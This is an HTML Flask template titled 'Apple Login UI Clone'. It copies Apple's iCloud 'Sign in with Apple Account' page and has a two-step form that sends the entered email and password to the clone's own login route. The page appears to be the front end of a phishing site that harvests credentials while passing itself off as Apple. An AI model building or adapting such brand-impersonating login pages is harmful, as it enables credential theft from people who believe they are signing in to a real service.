<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Apple Login UI Clone</title>
  <style>
    body {
      margin: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
      background-color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }

    .header {
      width: 100%;
      padding: 20px 40px;
      font-size: 22px;
      font-weight: 500;
      box-sizing: border-box;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      width: 100%;
      max-width: 600px;
      padding: 80px;
      margin: 40px;
      text-align: center;
      border-radius: 20px;
      box-shadow: 0 14px 40px rgba(0,0,0,0.12);
      box-sizing: border-box;
    }

    /* Apple logo image */
    .apple-logo {
      width: 400px;
      height: 200px;
      margin-bottom: 25px;
    }

    h2 {
      font-size: 26px;
      font-weight: 500;
      margin-bottom: 25px;
      margin-top: 0;
    }

    .input-wrapper {
      width: 100%;
      border: 1.5px solid #ccc;
      border-radius: 16px; /* Rounded corners */
      overflow: hidden;
      background: white;
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.08);
      transition: border 0.2s, box-shadow 0.2s;
    }

    .input-wrapper:focus-within {
      border: 1.5px solid #0071e3;
      box-shadow: 0 6px 25px rgba(0, 0, 0, 0.12);
    }

    .input-box {
      display: flex;
      align-items: center;
      padding: 12px;
      border-bottom: 1px solid #ccc;
    }

    .input-box:last-child {
      border-bottom: none;
    }

    .input-box input {
      flex: 1;
      border: none;
      outline: none;
      font-size: 17px;
      padding: 8px;
      background: transparent;
    }

    .input-box button {
      background: none;
      border: none;
      cursor: pointer;
      font-size: 20px;
      color: #0071e3;
      padding: 0;
      margin-left: 8px;
    }

    .keep-signed {
      margin-top: 15px;
      font-size: 15px;
      color: #555;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .keep-signed input {
      margin-right: 8px;
    }

    .forgot {
      margin-top: 18px;
      font-size: 15px;
    }

    .forgot a {
      color: #0071e3;
      text-decoration: none;
    }

    .forgot a:hover {
      text-decoration: underline;
    }

    @media (max-width: 600px) {
      .container {
        margin: 20px 10px;
        padding: 30px 20px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.08);
      }
      
      .input-wrapper {
        width: 100%;
      }
    }
  </style>
</head>
<body>
  <div class="header">iCloud</div>

  <div class="container">
    <!-- Apple logo -->
    <img src="{{ url_for('static' ,filename = 'image/cloud.png' ) }}" class="apple-logo">
    
    <h2>Sign in with Apple Account</h2>

    <!-- Form element added here -->
    <form id="loginForm" method="POST" action="{{ url_for('login') }}">
      <!-- Input container -->
      <div class="input-wrapper" id="login-box">
        <!-- Email row -->
        <div class="input-box" id="email-row">
          <input type="text" name="email" id="email" placeholder="Email or Phone Number" autocomplete="username" required />
          <button type="button" onclick="showPassword()" aria-label="Next">➔</button>
        </div>

        <!-- Password row (hidden) -->
        <div class="input-box" id="password-row" style="display: none;">
          <input type="password" name="password" id="password" placeholder="Password" autocomplete="current-password" required />
          <button type="submit" aria-label="Submit">➔</button>
        </div>
      </div>

      <div class="keep-signed">
        <input type="checkbox" id="keep" name="remember_me" />
        <label for="keep">Keep me signed in</label>
      </div>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>
    </form>
  </div>

  <div>
    <img src="{{ url_for('static' ,filename = 'image/footer.png' ) }}" alt="">
  </div>

  <script>
    function showPassword() {
      const emailInput = document.getElementById("email");
      if (emailInput.value.trim() === "") {
        alert("Please enter your email or phone number first.");
        return;
      }
      emailInput.setAttribute("readonly", true);
      emailInput.nextElementSibling.style.display = "none";
      document.getElementById("password-row").style.display = "flex";
      document.getElementById("password").focus();
    }
    
    // Form submission handler
    document.getElementById('loginForm').addEventListener('submit', function(e) {
      const passwordInput = document.getElementById("password");
      if (passwordInput.value.trim() === "") {
        e.preventDefault();
        alert("Please enter your password.");
        return;
      }
      // Form will submit normally if validation passes
    });

    // Add Enter key functionality
    document.getElementById("email").addEventListener("keypress", function(e) {
      if (e.key === "Enter") {
        e.preventDefault();
        showPassword();
      }
    });

    document.getElementById("password").addEventListener("keypress", function(e) {
      if (e.key === "Enter") {
        // Let the form submit normally
      }
    });
  </script>
</body>
</html>
